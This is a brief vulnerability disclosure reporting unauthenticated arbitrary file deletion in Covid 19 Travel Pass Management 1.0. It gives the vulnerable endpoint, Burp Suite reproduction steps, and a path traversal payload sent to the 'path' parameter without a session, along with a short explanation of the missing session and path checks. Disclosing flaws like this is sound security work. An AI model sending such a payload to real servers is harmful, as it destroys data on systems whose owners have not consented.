### In Covid 19 Travel Pass Management 1.0, I found Unathen Abitrary File Delete on server


Affected Version- 1.0

Affected Path : http://localhost/ctpms/classes/Master.php?f=delete_img (POST request, parameters path)
     
### Reproduce bug:

Step 1: On webserver, create file with command `touch /tmp/test1.txt`

Step 2: Use Burp Suite to create POST Request to http://localhost/ctpms/classes/Master.php?f=delete_img with parameters 'path'
(without any cookie and session) -> Unauth

![](./request_burp.png)

Delete abitrary file with Path Traversal payload: `path=../../../../../../../../../tmp/test1.txt`

Step 3: Send Request and get Response : `{"status":"success"}` -> File on server deleted.

### Vuln in code

Server does not check the session and filter path traversal payload (../../../) .
User can control input via parameters `path`

![](./vuln_code.png)
